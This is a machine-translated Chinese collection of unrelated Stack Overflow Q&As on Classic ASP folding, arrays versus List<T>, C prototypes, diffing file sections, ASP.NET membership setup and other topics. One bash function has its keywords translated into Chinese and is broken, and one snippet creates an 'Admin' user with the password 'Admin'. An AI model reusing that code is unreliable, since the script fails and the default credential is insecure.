有没有办法在 Visual Studio 2008 中为 Classic ASP 启用函数和子例程的折叠？我可以手动浏览并将代码块指定为可折叠的，但如果有办法自动执行此操作，它将为我节省大量时间。

否则，是否有其他支持此功能的 IDE 或文本编辑器？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-13T15:57:36.800

Notepad++ 有一个“函数列表”插件：

[http://sourceforge.net/project/showfiles.php?group_id=189927&package_id=223668](http://sourceforge.net/project/showfiles.php?group_id=189927&package_id=223668)

虽然这不允许您折叠您的 Classic ASP 函数和子例程，但它会在侧面板中列出它们，您可以单击它们从一个函数跳转到另一个函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-12T08:51:53.273

[Notepad++](http://notepad-plus.sourceforge.net "记事本++")允许您折叠代码。我不确定它是否在函数级别折叠，但它确实允许您折叠整个代码块和 HTML 块（例如，您可以折叠“head”或“div”块等）。

@coxymla：你确定是朋友吗？我刚刚在 Notepad++ 中打开了一个 HTML 页面，我可以折叠例如 HEAD 没有任何问题。也许我在上面的文字中解释得不够清楚，但那是因为英语不是我的主要语言。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T09:50:09.927

不幸的是，我一直无法找到一个好的解决方案。

当您打开 ASP 文档时，Notepad++ 允许您折叠函数和脚本块，但不能折叠 HTML 元素，即使您将语言设置为 HTML！（当您在 Notepad++ 中打开一个 .htm 文件时，它确实允许您折叠这些元素。）VS 2008 文本编辑器是相反的——HTML 元素是公平的游戏，但不是 ASP 代码本身。

为清晰起见进行了编辑。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-25T18:04:00.213

FunctionList 插件在 Windows 环境下不起作用...

NotePad++ 不会对 .asp 文件进行代码折叠...

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-31T17:30:21.733

[Primalscript](http://www.primaltools.com/)做到了这一点。它大多非常漂亮，除了它倾向于膨胀，这是令人沮丧的。它也很昂贵，但随着时间的推移，它增加的开发速度可能证明成本是合理的。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-12-09T03:02:41.787

Visual Studio Code/VS Code 非常适合经典的 asp，你需要在[`Classic ASP`这里找到的扩展。](https://marketplace.visualstudio.com/items?itemName=ilich8086.classic-asp)

# visual-studio-2008 - VS 2005 和 VS 2008 中工具箱上的缓存水晶报表控件

> ID：434758
> 
> 赞同：0
> 
> 时间：2009-01-12T08:05:23.117
> 
> 标签：visual-studio-2008, visual-studio-2005, crystal-reports

我在 VS2005 和 VS2008 的工具箱中有几个重复的自定义水晶报表控件。每个副本中的一个都以单词 Cached 开头。这些控件都是同一解决方案中其他项目的一部分。通过在控件上添加 [ToolboxItem(false)] 属性，我已经删除了一些我不想在工具箱上使用的主要控件，但缓存的那个仍然存在。如何从工具箱中删除这些缓存的控件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-12T10:21:59.317

每当您将 Crystal Report 添加到项目中时，它都会在 .cs 文件中创建两个类。第二个类与第一个命名类具有相同的名称，只是添加了单词 Cached。刚刚也将 [ToolboxItem(false)] 添加到第二类。

# .net - 数组与列表 : 什么时候用哪个？

> ID：434761
> 
> 赞同：703
> 
> 时间：2009-01-12T08:08:33.237
> 
> 标签：.net, arrays, list

```
MyClass[] array;
List<MyClass> list; 
```

一种比另一种更可取的情况是什么？为什么？

* * *

## 回答 #1

> 赞同：689
> 
> 时间：2009-01-12T08:10:58.427

实际上，您很少会想要使用数组。绝对在`List<T>`您想添加/删除数据的任何时候使用，因为调整数组大小很昂贵。**如果您知道数据是固定长度的，并且您想出于某些非常具体**的原因（在基准测试之后）进行微优化，那么数组可能会很有用。

`List<T>`提供*比*数组更多的功能（尽管 LINQ 稍微平衡了一点），而且几乎总是正确的选择。`params`当然，争论除外。;-p

作为计数器 -`List<T>`是一维的；where-因为您有矩形（等）数组，例如`int[,]`or `string[,,]`- 但是还有其他方法可以在对象模型中对此类数据进行建模（如果需要）。

也可以看看：

*   [如何/何时放弃在 c#.net 中使用数组？](https://stackoverflow.com/questions/75976/how-when-to-abandon-the-use-of-arrays-in-c-net)
*   [数组，有什么意义？](https://stackoverflow.com/questions/392397/arrays-whats-the-point)

也就是说，我在我的[protobuf-net](https://github.com/mgravell/protobuf-net)项目中**大量**使用了数组；完全出于性能：

*   它做了很多位移，所以 a`byte[]`对于编码非常重要；
*   我使用本地滚动`byte[]`缓冲区，然后再发送到底层流（和 vv）；比`BufferedStream`等快；
*   它在内部使用基于数组的对象模型（`Foo[]`而不是`List<Foo>`），因为一旦构建，大小就固定了，并且需要非常快。

但这绝对是个例外；对于一般业务线处理，`List<T>`每次都赢。

* * *

## 回答 #2

> 赞同：135
> 
> 时间：2009-01-12T08:26:44.667

真的只是回答添加一个我很惊讶的链接还没有被提及：Eric 的 Lippert 的博客文章[“阵列被认为有些有害”。](https://docs.microsoft.com/en-us/archive/blogs/ericlippert/arrays-considered-somewhat-harmful)

您可以从标题中判断它建议在任何可行的地方使用集合——但正如 Marc 正确指出的那样，在很多地方数组确实是唯一实用的解决方案。

* * *

## 回答 #3

> 赞同：25
> 
> 时间：2009-01-12T08:16:48.883

尽管有其他答案推荐`List<T>`，但您在处理时需要使用数组：

*   图像位图数据
*   其他低级数据结构（即网络协议）

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2009-01-12T08:12:54.803

除非你真的关心性能，我的意思是，“你为什么使用 .Net 而不是 C++？” 你应该坚持使用 List<>。它更易于维护，并为您在幕后完成调整数组大小的所有繁琐工作。（如有必要， List<> 在选择数组大小方面非常聪明，因此通常不需要。）

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2015-03-05T01:37:08.420

当集合本身的不变性是客户端和提供者代码之间合同的一部分（不一定是集合中项目的不变性）并且 IEnumerable 不适合时，**应**优先使用数组而不是 List。

例如，

```
var str = "This is a string";
var strChars = str.ToCharArray();  // returns array 
```

很明显，修改“strChars”不会改变原始的“str”对象，无论“str”的底层类型的实现级知识如何。

但是假设

```
var str = "This is a string";
var strChars = str.ToCharList();  // returns List<char>
strChars.Insert(0, 'X'); 
```

在这种情况下，仅从该代码段尚不清楚插入方法是否会改变原始的“str”对象。它需要 String 的实现级别知识才能做出决定，这打破了按合同设计的方法。在 String 的情况下，这没什么大不了的，但在几乎所有其他情况下它都可能是个大问题。将列表设置为只读确实有帮助，但会导致运行时错误，而不是编译时错误。

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2009-01-12T08:37:01.290

如果我确切地知道我需要多少个元素，比如说我需要 5 个元素并且只需要 5**个**元素，那么我会使用一个数组。否则我只使用 List<T>。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2009-11-23T09:45:58.140

大多数时候，使用 a`List`就足够了。A`List`使用内部数组来处理其数据，并在向其添加`List`超过其当前容量的元素时自动调整数组的大小，这使其比您需要事先知道容量的数组更易于使用。

有关C# 中列表的更多信息，请参阅[http://msdn.microsoft.com/en-us/library/ms379570(v=vs.80).aspx#datastructures20_1_topic5](http://msdn.microsoft.com/en-us/library/ms379570(v=vs.80).aspx#datastructures20_1_topic5)`System.Collections.Generic.List<T>`或仅反编译。

如果您需要多维数据（例如使用矩阵或图形编程），您可能会选择一个`array`。

与往常一样，如果内存或性能是一个问题，请测量它！否则，您可能会对代码做出错误的假设。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2019-01-07T23:50:56.753

数组与。列表是一个经典的可维护性与性能问题。几乎所有开发人员都遵循的经验法则是，您应该同时兼顾两者，但是当它们发生冲突时，请选择可维护性而不是性能。该规则的例外情况是性能已经被证明是一个问题。如果你把这个原则带到 Arrays Vs. 列表，那么你得到的是这样的：

使用强类型列表，直到遇到性能问题。如果您遇到性能问题，请决定退出阵列是否会使您的解决方案在性能方面受益，而不是在维护方面对您的解决方案不利。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2014-08-21T21:17:28.947

尚未提及的另一种情况是当一个人有大量项目时，每个项目都由一组固定的相关但独立的变量粘在一起（例如，点的坐标，或 3d 三角形的顶点）。一组暴露字段结构将允许其元素被有效地“就地”修改——这是任何其他集合类型都不可能实现的。因为结构数组在 RAM 中连续保存其元素，所以对数组元素的顺序访问可以非常快。在代码需要对数组进行多次顺序传递的情况下，结构数组的性能可能比数组或其他类对象引用集合的性能高出 2:1；更远，

尽管数组不可调整大小，但不难让代码存储数组引用以及正在使用的元素数量，并根据需要用更大的数组替换数组。或者，可以很容易地为一种行为类似于 a`List<T>`但暴露其后备存储的类型编写代码，从而允许使用`MyPoints.Add(nextPoint);`or 或`MyPoints.Items[23].X += 5;`。请注意，如果代码尝试访问列表末尾之外的内容，后者不一定会引发异常，但否则在概念上的用法与`List<T>`.

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2017-07-09T05:39:41.267

.NET 中的列表是数组的包装器，并在内部使用数组。列表操作的时间复杂度与数组相同，但是所有添加的功能/列表的易用性（例如自动调整大小和列表类附带的方法）都会产生更多开销。几乎，我建议在所有情况下都使用列表，除非有令人信服的理由*不*这样做，例如，如果您需要编写极其优化的代码，或者正在使用其他围绕数组构建的代码。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2018-02-27T06:06:04.567

由于没有人提到：在 C# 中，数组是一个列表。[`MyClass[]`](https://docs.microsoft.com/en-us/dotnet/api/system.array)并且[`List<MyClass>`](https://docs.microsoft.com/en-us/dotnet/api/system.collections.generic.list-1)都实现了[`IList<MyClass>`](https://docs.microsoft.com/en-us/dotnet/api/system.collections.generic.ilist-1). （例如`void Foo(IList<int> foo)`可以称为 like`Foo(new[] { 1, 2, 3 })`或`Foo(new List<int> { 1, 2, 3 })`）

因此，如果您正在编写一个接受 a`List<MyClass>`作为参数但仅使用功能子集的方法，您可能希望声明为 as`IList<MyClass>`以方便调用者。

细节：

*   [为什么数组实现IList？](https://stackoverflow.com/q/5968708/)
*   [C# 中的数组如何部分实现 IList<T>？](https://stackoverflow.com/q/11163297/)

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2015-04-28T21:22:49.017

与其比较每种数据类型的特性，我认为最实用的答案是“差异对于你需要完成的事情可能并不那么重要，特别是因为它们都实现了`IEnumerable`，所以遵循流行的约定并使用`List`直到你有理由不这样做，此时你可能会有理由使用数组而不是`List`."

大多数情况下，在托管代码中，您希望集合尽可能易于使用，而不是担心微优化。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2018-04-15T22:16:01.147

它们可能不受欢迎，但我是游戏项目中数组的粉丝。- 在某些情况下，迭代速度可能很重要，如果您对每个元素做的不多，则数组上的 foreach 开销显着减少 - 使用辅助函数添加和删除并不难 - 它较慢，但在您只构建一次的情况下可能没关系 - 在大多数情况下，浪费的额外内存更少（仅对结构数组非常重要） - 垃圾和指针以及指针追逐稍微减少

话虽如此，在实践中，我使用 List 的次数远远多于 Arrays，但它们各有各的位置。

如果 List 有一个内置类型，那就太好了，这样他们就可以优化包装器和枚举开销。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2018-12-15T21:07:52.413

填充列表比数组更容易。对于数组，您需要知道数据的确切长度，但对于列表，数据大小可以是任意的。而且，您可以将列表转换为数组。

```
List<URLDTO> urls = new List<URLDTO>();

urls.Add(new URLDTO() {
    key = "wiki",
    url = "https://...",
});

urls.Add(new URLDTO()
{
    key = "url",
    url = "http://...",
});

urls.Add(new URLDTO()
{
    key = "dir",
    url = "https://...",
});

// convert a list into an array: URLDTO[]
return urls.ToArray(); 
```

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2021-11-10T11:54:53.180

请记住，使用 List 无法做到这一点：

```
List<string> arr = new List<string>();

arr.Add("string a");
arr.Add("string b");
arr.Add("string c");
arr.Add("string d");

arr[10] = "new string"; 
```

它会生成一个异常。

而是使用数组：

```
string[] strArr = new string[20];

strArr[0] = "string a";
strArr[1] = "string b";
strArr[2] = "string c";
strArr[3] = "string d";

strArr[10] = "new string"; 
```

但是对于数组，没有自动调整数据结构的大小。您必须手动或使用 Array.Resize 方法来管理它。

一个技巧可能是用一个空数组初始化一个 List。

```
List<string> arr = new List<string>(new string[100]);

arr[10] = "new string"; 
```

但是在这种情况下，如果您使用 Add 方法放置一个新元素，它将被注入到 List 的末尾。

```
List<string> arr = new List<string>(new string[100]);

arr[10] = "new string";

arr.Add("bla bla bla"); // this will be in the end of List 
```

* * *

## 回答 #16

> 赞同：-2
> 
> 时间：2009-01-12T08:16:28.727

它完全取决于需要数据结构的上下文。例如，如果您正在创建项目以供其他功能或服务使用，那么使用 List 是完成它的完美方式。

现在，如果您有一个项目列表并且只想显示它们，例如在网页数组上是您需要使用的容器。

# linq-to-sql - 为什么在可视化编辑器中编辑后，LinqToSql dbml 三元组的 x.designer.cs 部分会消失？

> ID：434762
> 
> 赞同：3
> 
> 时间：2009-01-12T08:08:58.150
> 
> 标签：linq-to-sql, .net-3.5

我遇到了一个特别烦人的问题。我有一个 LinqToSql 项目正在运行..

一个 X.dbml 文件具有三个从属文件 X.cs、X.dbml.layout 和 X.designer.cs
现在，当我将一个附加表放入设计器表面并重命名该表时，我得到一个属性值无效'未指定错误'。
奇怪的。但不知何故**，您的 X.designer.cs 文件从您的项目中消失了。现在你的构建被破坏了。**（如果您不使用源代码管理，请上帝帮助您！）

我无法对我的 dbml 文件进行编辑...

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-05T13:30:36.757

此外，这已作为一个[Connect Bug](https://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=361577)提出，当它出现时，他们已将其标记为“在以后的版本中修复”。

还有一些其他的解决方法：

如果您有一个部分类，请确保任何 using 语句都带有命名空间：

```
namespace cScape.PM.DataStore.DataContexts
{
  using System.Collections.Generic;
  using System.Linq;

  partial class ConfigDataContext
  {
    [...]
  }
} 
```

然后右键单击 DBML 文件，并选择“运行自定义工具”。这将重新生成您的设计器文件，然后您可以构建您的项目 - 这对我来说效果更好，尤其是当我们使用 TFS 时，这会导致相当奇怪的签入。

连接错误链接到该四人讨论的中间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-12T08:13:12.947

（以 KB 发布） [似乎 .net 3.5 SP1 打破了这一点。](http://forums.microsoft.com/msdn/ShowPost.aspx?PostID=3738879&SiteID=1&pageid=0)

对我有用的解决方法...

*   在解决方案资源管理器中将 X.dbml 重命名为 Y.dbml。这应该会带回您的 Designer.cs 文件。再次将其重命名回 X.dbml

这绝对是疯了。您必须在每次编辑 dbml 后执行此操作。我现在正在安装 3.5SP1

# c - C89、C90 或 C99 中的所有功能都需要原型吗？

> ID：434763
> 
> 赞同：50
> 
> 时间：2009-01-12T08:09:42.377
> 
> 标签：c, c99, c89

为了真正符合标准，C 中的所有函数（除了 main）是否都必须有一个原型，即使它们只是在同一个翻译单元中定义后才使用？

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2009-01-13T02:16:25.163

这取决于您所说的“真正符合标准”的含义。然而，简短的回答是“在使用之前确保所有函数在范围内都有一个原型是一个好主意”。

一个更合格的答案指出，如果函数接受可变参数（特别是`printf()`函数族），那么原型必须在严格符合标准的范围内。C89（来自 ANSI）和 C90（来自 ISO；与 C89 相同，除了部分编号）也是如此。但是，除了 'varargs' 函数之外，`int`不必声明返回 an 的函数，并且返回非 an 的函数`int`确实需要一个显示返回类型但不需要参数列表的原型的声明。

但是请注意，如果函数采用在没有原型的情况下受“正常提升”约束的参数（例如，采用 a`char`或`short`- 两者都转换为`int`的函数；更严重的是，可能采用a`float`而不是 a `double`)，则需要一个原型。标准对此很宽松，以允许旧的 C 代码在符合标准的编译器下编译；编写较旧的代码不是为了担心确保在使用之前声明函数 - 根据定义，较旧的代码不使用原型，因为它们在 C 中不可用，直到有一个标准。

C99 不允许 'implicit int' ...这意味着像 ' `static a;`' （`int`默认情况下）这样的奇怪情况以及隐式函数声明。在 ISO/IEC 9899:1999 的前言中提到了这些（以及大约 50 项其他重大变化），该标准将该标准与以前的版本进行了比较：

> *   删除隐式`int`
>     …
> *   删除隐式函数声明

在 ISO/IEC 9899:1990 中，§6.3.2.2**函数调用**声明：

> 如果函数调用中带括号的参数列表之前的表达式仅包含一个标识符，并且如果该标识符没有可见的声明，则该标识符被隐式声明，就好像在包含函数调用的最里面的块中，声明：
> 
> ```
> extern int identifier(); 
> ```
> 
> 出现了。^(38)
> 
> ^(38)也就是说，具有块范围的标识符声明为与类型函数具有外部链接，没有参数信息并返回`int`. 如果事实上它没有被定义为具有“函数返回`int`”类型，那么行为是未定义的。

1999 年标准中缺少这一段。我还没有（还）跟踪`static a;`在 C90 中允许和`static int a;`在 C99 中不允许（要求）的措辞变化。

请注意，如果一个函数是静态的，它可以在使用之前定义，并且不需要在前面声明。如果在定义非静态函数之前没有声明 ( `-Wmissing-prototypes`)，那么 GCC 可能会被说服。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2013-08-23T22:33:19.667

*原型*是指定函数参数类型的函数声明。

Pre-ANSI C（1978 年第一版 Kernighan & Ritchie 的“The C Programming Language”所描述的语言）没有原型；函数声明不可能描述参数的数量或类型。由调用者传递正确数量和类型的参数。

ANSI C 引入了“原型”，即指定参数类型的声明（从早期 C++ 借用的特性）。

从 C89/C90（ANSI 和 ISO 标准描述相同的语言）开始，调用没有可见声明的函数是合法的；提供了一个隐式声明。如果隐式声明与实际定义不兼容（例如，调用`sqrt("foo")`，则行为未定义。此隐式声明和非原型声明都不能与可变参数函数兼容，因此对可变参数函数的任何调用（如`printf`or `scanf`）必须有一个可见的原型。

C99 删除了隐式声明。任何对没有可见声明的函数的调用都是违反约束的，需要编译器诊断。但是该声明仍然不需要是原型；它可以是不指定参数类型的旧式声明。

C11 在这方面没有做出重大改变。

因此，即使在 2011 年 ISO C 标准中，旧式函数声明和定义（自 1989 年以来已“过时”）仍然允许在符合代码中。

对于可追溯到 1989 年的所有 C 版本，就风格而言，几乎没有理由不对所有函数使用原型。保留旧式声明和定义只是为了避免破坏旧代码。

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2009-01-12T08:39:17.230

不，函数并不总是需要原型。唯一的要求是在使用之前“声明”一个函数。声明函数有两种方法：编写原型，或编写函数本身（称为“定义”）。定义始终是声明，但并非所有声明都是定义。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-09-06T10:20:53.760

编写新函数时的一个很好的技巧是把它们倒过来写，main 在底部，这样当你改变对函数的参数或返回类型的想法时，你也不必修复原型。不断地修复原型，并在它们过时时处理所有编译器的警告变得非常乏味。

一旦你的函数一起顺利运行，将代码移动到一个命名良好的模块中，并将原型放在一个同名的 .h 文件中。它可以节省大量时间。5 年来我发现的最大的生产力辅助工具。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-13T02:00:50.607

是的，每个函数都必须有一个原型，但该原型可能出现在单独的声明中或作为函数定义的一部分。用 C89 及更高版本编写的函数定义自然有原型，但如果你用经典的 K&R 风格编写东西，那么：

```
main (argc, argv)

  int argc;
  char **argv;

{
  ...
} 
```

那么函数定义没有原型。如果您编写 ANSI C (C89) 样式，则：

```
main (int argc, char **argv) { ... } 
```

那么函数定义就有了原型。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-12T08:44:15.160

据我所知（在 ANSI C89/ISO C90 中），没有。我不确定 C99；但是，我也希望如此。

**个人说明：**我只写函数原型...

1.  我需要（当 A() 调用 B()*并且*B() 调用 A()），或者
2.  我正在导出函数；否则，感觉是多余的。

# linux - 如何区分同一文件的两个部分？

> ID：434766
> 
> 赞同：13
> 
> 时间：2009-01-12T08:11:08.190
> 
> 标签：linux, language-agnostic, diff

我有一个包含两个相似但略有不同的部分的源文件。我想将这两个部分合并到一个子程序中，并带有一个处理细微差异的参数，但我需要确保我知道它们，所以我不会错过任何一个。
在这种情况下，我通常做的是将每个部分复制到一个单独的文件中，然后使用 tkdiff 或 vimdiff 来突出显示差异。有没有办法跳过中间文件，只区分同一个文件的两个部分？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2015-12-10T18:12:37.623

Vim的[linediff](http://www.vim.org/scripts/script.php?script_id=3745)插件很适合我。直观地选择文件的一部分并键入`:Linediff`. 直观地选择其他部分并键入`:Linediff`。它会将 vim 置于[vimdiff](https://gist.github.com/mattratleph/4026987)模式，仅显示您之前突出显示的两个部分。键入`:LinediffReset`以退出 vimdiff 模式。

更多信息：

[https://unix.stackexchange.com/a/52759/32477](https://unix.stackexchange.com/a/52759/32477)

[https://superuser.com/a/414958/199800](https://superuser.com/a/414958/199800)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-01-12T12:30:41.897

[KDiff3](http://kdiff3.sourceforge.net/)是开源的，可在包括 Win32 和 Linux 在内的多个平台上使用。

它具有 Gishu 关于[Beyond Compare](http://www.scootersoftware.com/)讨论的“手动对齐”功能（顺便说一下，我个人没有使用过，但我认识的很多人都认为它是一个很棒的工具）。

![手动对齐示例](https://i.stack.imgur.com/RO1nJ.png) 有关更多示例，请参[见此答案](https://stackoverflow.com/questions/5067839/context-aware-merge/5117210#5117210)。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-01-12T08:17:43.543

我使用[超越比较](http://www.scootersoftware.com/)。
它允许您在每一侧选择一条线并说“手动对齐”。这对你来说应该很好。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2010-01-11T21:03:33.433

我选择将@ordnungswidrig 的答案重新编写为 bash 函数（我只对单个文件的差异感兴趣，但这可以很容易地更改为处理两个不同的文件......）：

```
# 查找文件中的差异，给出两个部分的开始行和结束行
功能 diff_sections {
  本地 fname=`basename $1`;
  本地临时文件=`mktemp -t $fname`;
  头 -$3 $1 | 尾 +$2 > $tempfile && 头 -$5 $1 | 尾 +$4 | 差异 -u $tempfile - ;
  rm $临时文件；
}

```

你像这样调用函数...... `diff_sections path/to/file 464 483 485 506`

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-14T18:20:10.787

任何可以让您手动调整对齐的差异工具都可以完成这项工作。漫反射 ( [http://diffuse.sourceforge.net/](http://diffuse.sourceforge.net/) ) 是我的最爱，它还可以让您手动调整对齐方式。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-12T09:22:55.207

如果您可以使用正则表达式描述要组合的部分的开头和结尾，则可以使用以下内容：

```
sh -c 't=`mktemp`; cat "$0" | grep -e "$2" -A10000 | grep -e "$3" -B 10000 > $t; cat "$1" | grep -e "$2" -A10000 | grep -e "$3" -B 10000 | diff -u $t - ; rm $t' firstfile secondfile "section start" "section end" 
```

作为替代方案，如果您想按行号描述该部分，您可以执行以下操作：

```
sh -c 't=`mktemp`; cat "$0" | head -$3 |tail +$2 > $t; cat "$1" | head -$5 | tail +$4 | diff -u $t - ; rm $t' first second 4 10 2 8 
```

4 10 2 8 是第一个文件和第二个文件中要考虑的部分的开始和结束行号。

您可以将片段保存为 shell 脚本或别名。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-02-07T01:41:54.683

Emacs 有[ediff-regions-wordwise](https://emacs.stackexchange.com/q/18369/16777) —— 你可以取两个缓冲区（或只一个）并在每个缓冲区中选择一个区域，然后 ediff 将显示该区域以进行比较。

# asp.net-mvc - 如何在 ASP.NET MVC 应用程序中添加第一个用户（root）？

> ID：434776
> 
> 赞同：1
> 
> 时间：2009-01-12T08:15:20.350
> 
> 标签：asp.net-mvc, asp.net-membership, security

我正在使用 ASP.NET MVC 框架并试图了解 ASP Membership 3.5 的东西。

[无需登录](http://en.wikipedia.org/wiki/Chicken_or_the_egg)即可添加第一个管理员用户的最佳方法是什么？我一直盯着[会员入门工具包的来源](http://www.codeplex.com/MvcMembership)，但没有找到。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-12T10:28:54.373

一个简单的解决方案（尤其是或仅用于开发目的），通过“设置”操作进行：

```
if (!Roles.RoleExists("Administrator"))
{
    Roles.CreateRole("Administrator");
}
if (Membership.GetUser("Admin") == null)
{
    Membership.CreateUser("Admin", "Admin");
    Roles.AddUserToRole("Admin", "Administrator");
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-12T08:31:30.397

取决于您使用的成员资格提供程序。如果您使用 SQL 成员资格提供程序，您应该能够使用常规的 Asp.Net 配置工具。（项目菜单 -> Asp.Net 配置）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-12T18:41:27.030

你说你要分享​​这个项目。我建议创建一个一次性运行的页面，该页面创建用户并为其分配所需的角色。之后，页面的任何并发运行都应该检查您想要的用户以及是否存在重定向或其他一些机制。

# hosting - 合理的停机时间

> ID：434781
> 
> 赞同：2
> 
> 时间：2009-01-12T08:17:26.527
> 
> 标签：hosting, web-hosting, uptime, downtime

我通过各种托管服务提供商运行大约 5 个不同的托管服务器。在过去的两个月里，我工作的一台服务器出现了两次宕机。两次都出乎意料并且相当长（36小时和4小时）。有问题的服务器是 VPS，而不是共享服务器。鉴于我与其他服务器/提供商（VPS 和共享）的经验，这似乎是不可接受的停机时间。

*   你怎么看？
*   您认为服务器的合理停机时间（计划内和计划外）是多少？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-12T08:21:22.803

你得到你所付出的。

您与提供商的 SLA 是什么？你有吗？如果有任何一个因素可以解释价格差异，那就是这个。如果您需要保证正常运行时间（例如 3 个 9 秒），那么您必须为此付费。例如，5 个 9 的正常运行时间将花费您更多的钱。

回答您的问题：您是否得到了有关停机原因的解释？36 小时太长了。4小时不一定（如果它很少见）。是硬件故障吗？如果是这样，您将无能为力。我曾经有一个提供商，他偶尔会填满**他们的**配置，邮件会停止工作，直到我告诉他们修复它。对我来说，这是不可接受的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-21T05:59:32.263

服务器硬件将出现故障。这只是时间问题。而不是试图确定什么是合理的，我会问你另一个问题：你的配置可能失败的所有可能方式是什么，你准备好改变你的设置来解决这些可能性吗？

例如，假设您的网站托管在单个 VPS 上。一些失败的例子可能是：

1.  VPS 可能会损坏
2.  管理程序可能会失败
3.  机柜中的网络设备可能会死机
4.  数据中心可能存在电力/热量问题
5.  骨干互联网连接可能会下降。

您可以通过部署负载均衡器和第二个 VPS 来降低 #1 和 #2 导致站点瘫痪的风险。这种降低的风险值得额外的费用吗？

这种讨论在某些时候变成了灾难恢复问题。

# java - 如何在 Java 中对多声道声音输入进行采样

> ID：434803
> 
> 赞同：8
> 
> 时间：2009-01-12T08:36:40.853
> 
> 标签：java, audio-recording, javasound

我意识到这可能是相对利基的，但也许这就是为什么无论如何都可以问这个问题的原因。我正在寻找一个硬件多输入录音控制台（例如 Alesis IO 26）来接收一个 Adat 光管 8 通道输入来进行信号处理。由于我还没有购买该设备并且需要确定这是否可行（预算问题），我想问一下是否有人有使用 Java 中的所有这 8 个输入数据的经验？我已经看到了大量使用 Javax.sound.sampled 库录制声音的示例，但我找不到任何超过 2 的多通道信息。我感兴趣的是将 8 个通道单独作为单声道源进行采样对它们执行一些简单的 DSP。硬件设备会被视为一个混音器吗？8个通道被表示为8条线？我希望我的术语是正确的。

如果有人可以向我指出任何相关信息，我将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-02T20:59:41.833

根据您运行的 Java 版本、运行的平台以及运行的声卡类型，Java 中应该可以实现多声道音频。有关更多详细信息，请参阅出色的[Java 音频常见问题解答](http://www.jsresources.org/faq_audio.html)。我从来没有能够在所有平台上可靠地使用它。

如果您真的关心制作强大的多声道音频，我建议您使用 C API，例如[PortAudio](http://www.portaudio.com/)、[Juce](http://www.rawmaterialsoftware.com/juce/)或[PulseAudio](http://www.pulseaudio.org/)。

我在使用 PortAudio 和 Juce 时都非常幸运。

要在 Java 中使用这些，您需要为 C API 创建一个[JNI](http://en.wikipedia.org/wiki/Java_Native_Interface)接口。

这显然比仅仅使用 javax.sound 需要更多的工作，但它可以让您更好地控制正在使用的音频硬件。根据我处理音频设备的经验，与硬件相距太远（即 4 层抽象而不是 2 层）通常会使您无法进行严肃的多通道、高位深度、高采样率音频。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-30T09:59:30.513

我已经用级联到 32 个输入的 Terratec 卡实现了类似的东西，当时唯一的库是 Jsyn。

一旦你了解它，它就是一个非常好的图书馆。

http://www.softsynth.com/jsyn

我不确定是否还有其他可以提供帮助的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-03T23:39:24.313

我刚刚为 PortAudio 添加了一个 Java JNI 包装器。计划是与 PortAudio 源一起维护它。PortAudio 支持 N>2 的多声道音频。

今天，2012 年 9 月 3 日，JPortAudio 仍处于 alpha 模式。当你读到这篇文章时，它可能已经稳定了。

[http://www.portaudio.com/docs/v19-doxydocs/java_binding.html](http://www.portaudio.com/docs/v19-doxydocs/java_binding.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-28T14:41:47.360

我无法直接回答 javax.sound API 是否适用于多通道（但根据 API 文档它应该）。

但是，我采用了另一种方式使用 Java 进行多通道音频处理，这可能也对您有用。我使用 Jack（Jack 音频连接套件）将信号从音频设备传输到音频设备，然后使用 Jack 库执行信号处理。你没有提到你的目标操作系统。我在 Linux 下成功地使用了这种方法。AFAIR 在路上有一个供 Jack 使用的 Windows 端口。

ciao，榆树

# php - 如何在 PHPMyAdmin 中使 MySql 中的字段自动递增？

> ID：434810
> 
> 赞同：18
> 
> 时间：2009-01-12T08:38:03.847
> 
> 标签：php, mysql, phpmyadmin

我在表中创建了一个字段并将其设置为索引，但是当添加新项目时，我无法让它自行增加。我如何通过 PHPMyAdmin 做到这一点？

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2009-01-12T08:46:08.887

创建/编辑列时选中 A_I 复选框。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-03-17T12:42:07.110

